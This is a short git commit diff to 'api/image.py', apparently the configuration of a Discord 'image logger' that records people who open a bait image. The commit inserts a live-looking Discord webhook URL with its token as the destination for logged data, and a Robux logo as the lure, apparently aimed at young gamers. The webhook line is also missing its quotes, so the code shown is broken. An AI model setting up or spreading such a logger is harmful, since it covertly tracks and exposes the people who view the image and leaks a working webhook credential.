e82c3edaf89fe411c686f5d25212117f149a3183
luddmast3r <ludvig.nrdstrm@gmail.com>
2025-03-18 19:22:11 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": https://discord.com/api/webhooks/1351619349105868830/SDoSKJ2LUFGPay1M1hskE0_JwFsgpoA9BpVE7thRuiLMe2H52lzCMjj-eq_3YCLSJbiw
+    "image": "https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
